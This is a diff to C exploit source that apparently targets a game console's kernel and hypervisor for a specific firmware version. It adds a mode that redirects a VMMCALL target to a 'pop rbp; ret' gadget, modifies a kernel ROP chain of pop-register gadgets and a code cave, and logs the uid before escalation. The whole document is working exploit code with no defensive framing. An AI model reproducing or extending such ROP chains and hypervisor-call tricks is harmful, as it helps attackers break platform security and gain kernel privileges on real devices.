@@ -31,6 +31,14 @@
 #define BALANCE_OFF          0xD22AA7ULL
 #define SOC_PHAT             0x840F60
 
+#ifdef KERNEL_VMMCALL_SKIP_1270
+#define PROBE_MODE           "skip-vmmcall"
+#define CALL_TARGET_OFF      (VMMCALL_OFF + 3ULL) /* pop rbp; ret */
+#else
+#define PROBE_MODE           "vmmcall"
+#define CALL_TARGET_OFF      VMMCALL_OFF
+#endif
+
 extern unsigned long KERNEL_ADDRESS_DMAP_BASE;
 extern int sceKernelGetMainSocId(void);
 
@@ -153,16 +161,16 @@ int main(void)
   hook.oneshot = 1;
 
   int uid_before = getuid();
-  klog("KVC1270,2,start,fw=0x%08x,target=0x%016" PRIx64
+  klog("KVC1270,2,start,mode=%s,fw=0x%08x,target=0x%016" PRIx64
        ",target_offset=0x%016" PRIx64 ",uid_before=%d\n",
-       fw, target, target - ktext(0), uid_before);
+       PROBE_MODE, fw, target, target - ktext(0), uid_before);
   uint8_t handler_buf[10 * sizeof(uint64_t)] = {0};
   kh_chain_t handler;
   kh_chain_init(&handler, handler_buf, sizeof(handler_buf));
   kh_chain_g(&handler, KERNEL_GADGET_POP_RAX);
   kh_chain_q(&handler, VMMCALL_COMMAND);
   kh_chain_g(&handler, KERNEL_GADGET_POP_RDI);
-  kh_chain_q(&handler, ktext(VMMCALL_OFF));
+  kh_chain_q(&handler, ktext(CALL_TARGET_OFF));
   kh_chain_q(&handler, ktext(BALANCE_OFF));
   kh_chain_g(&handler, KERNEL_GADGET_POP_RCX);
   kh_chain_q(&handler, cave + KH_OFF_USER + 8);
